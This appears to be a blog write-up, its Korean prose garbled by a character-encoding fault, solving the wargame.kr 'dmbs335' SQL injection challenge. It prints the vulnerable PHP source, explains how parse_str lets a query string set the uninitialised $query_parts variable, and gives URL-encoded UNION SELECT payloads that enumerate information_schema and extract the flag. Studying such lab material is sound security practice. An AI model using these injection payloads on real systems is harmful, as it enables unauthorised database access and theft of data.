---
layout: single
title: "[wargamme.kr] dmbs-335 write-up"
date: 2025-11-13 18:26 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: ëª©ì°¨
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [wargame.kr] dmbs335

### ğŸ˜ë¬¸ì œ ì„¤ëª…

```
SQL injection Challenge!
(injection)

- thx to dmbs335
```

<br>

### âœï¸ í’€ì´

ë¬¸ì œì— ì ‘ì†í•˜ë©´ ì•„ë˜ì™€ ê°™ì´ ë°ì´í„°ë¥¼ ì¡°íšŒí•˜ëŠ” í¼ì´ ì¡´ì¬í•œë‹¤.

![image-20251117182324944](/images/2025-11-17-dmbs335/image-20251117182324944.png)

<br>

ì•„ë˜ ì†ŒìŠ¤ ì½”ë“œë¥¼ ì‚´í´ë³´ë©´, operator ê°’ì—ëŠ” andì™€ or ë°–ì— ëª»ë„£ëŠ”ë‹¤. ë˜í•œ QUERY_STRING ë¶€ë¶„ì— `parse_str` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í–ˆëŠ”ë°, ì´ í•¨ìˆ˜ëŠ”`key=value&key2=value2` ì´ëŸ°ì‹ìœ¼ë¡œ ì €ì¥ë˜ë©´ ì•„ë˜ì²˜ëŸ¼ ë™ì‘í•œë‹¤.

```
$key='value';
$key2='value2';
```

```php
<?php 

function getOperator(&$operator) { 
    switch($operator) { 
        case 'and': 
        case '&&': 
            $operator = 'and'; 
            break; 
        case 'or': 
        case '||': 
            $operator = 'or'; 
            break; 
        default: 
            $operator = 'or'; 
            break; 
}} 

if(preg_match('/session/isUD',$_SERVER['QUERY_STRING'])) {
    exit('not allowed');
}

parse_str($_SERVER['QUERY_STRING']); 
getOperator($operator); 
$keyword = addslashes($keyword);
$where_clause = ''; 

if(!isset($search_cols)) { 
    $search_cols = 'subject|content'; 
} 

$cols = explode('|',$search_cols); 

foreach($cols as $col) { 
    $col = preg_match('/^(subject|content|writer)$/isDU',$col) ? $col : ''; 
    if($col) { 
        $query_parts = $col . " like '%" . $keyword . "%'"; 
    } 

    if($query_parts) { 
        $where_clause .= $query_parts; 
        $where_clause .= ' '; 
        $where_clause .= $operator; 
        $where_clause .= ' '; 
        $query_parts = ''; 
    } 
} 
?>
```

<br>

ì´ ë¶€ë¶„ì„ ë” ì‚´í´ë³´ë©´ `$col` ë³€ìˆ˜ì— ì•„ë¬´ëŸ° ê°’ì´ ì—†ì„ ê²½ìš°ì— ì´ˆê¸°í™”ë˜ì§€ ì•Šê³ , $query_parts ë¶€ë¶„ì„ url ì¿¼ë¦¬ ë’·ë¶€ë¶„ì— ì¶”ê°€í•˜ì—¬ sqlië¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.

```php
parse_str($_SERVER['QUERY_STRING']); 
getOperator($operator); 
$keyword = addslashes($keyword);
$where_clause = ''; 

if(!isset($search_cols)) { 
    $search_cols = 'subject|content'; 
} 

$cols = explode('|',$search_cols); 

foreach($cols as $col) { 
    $col = preg_match('/^(subject|content|writer)$/isDU',$col) ? $col : ''; 
    if($col) { 
        $query_parts = $col . " like '%" . $keyword . "%'"; 
    } 

    if($query_parts) { 
        $where_clause .= $query_parts; 
        $where_clause .= ' '; 
        $where_clause .= $operator; 
        $where_clause .= ' '; 
        $query_parts = ''; 
    } 
} 
```

<br>

ì•„ë˜ query_parts íŒŒë¼ë¯¸í„°ì— `1%20union%20select%201,2,3,4` ë¥¼ í•´ë³´ë©´ ì»¬ëŸ¼ ìˆ˜ê°€ 4ê°œë¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.

![image-20251117234215738](/images/2025-11-17-dmbs335/image-20251117234215738.png)

<br>

ì•„ë˜ ê°’ì„ query_parts íŒŒë¼ë¯¸í„°ì— ë„£ì–´ í™•ì¸í•´ë³´ë©´ flag í…Œì´ë¸” ëª…ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

`1%20union%20select%201,table_name,3,4%20from%20information_schema.tables%23` 

![image-20251117234757220](/images/2025-11-17-dmbs335/image-20251117234757220.png)

<br>

ì´ì œ ì»¬ëŸ¼ ëª…ì„ ì•Œê¸° ìœ„í•´ ì•„ë˜ì™€ ê°™ì´ columnìœ¼ë¡œ ë°”ê¿”ì„œ ë„£ì–´ë³´ë©´ ì»¬ëŸ¼ëª…ì´ f1agì¸ ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.

`1%20union%20select%201,column_name,3,4%20from%20information_schema.columns%23`

![image-20251117234924240](/images/2025-11-17-dmbs335/image-20251117234924240.png)

<br>

ê·¸ëŸ¼ ì´ì œ ì»¬ëŸ¼ ëª…ê³¼ í…Œì´ë¸” ëª…ì„ ì•Œì•˜ìœ¼ë‹ˆ ì•„ë˜ ì¿¼ë¦¬ë¥¼ query_parts íŒŒë¼ë¯¸í„°ì— ë„£ì–´ ì¡°íšŒí•´ë³´ë©´ flag ê°’ì„ ì¶”ì¶œí•  ìˆ˜ ìˆë‹¤. 

`1%20union%20select%201,f1ag,3,4%20from%20Th1s_1s_Flag_tbl%23`

![image-20251117235124877](/images/2025-11-17-dmbs335/image-20251117235124877.png)
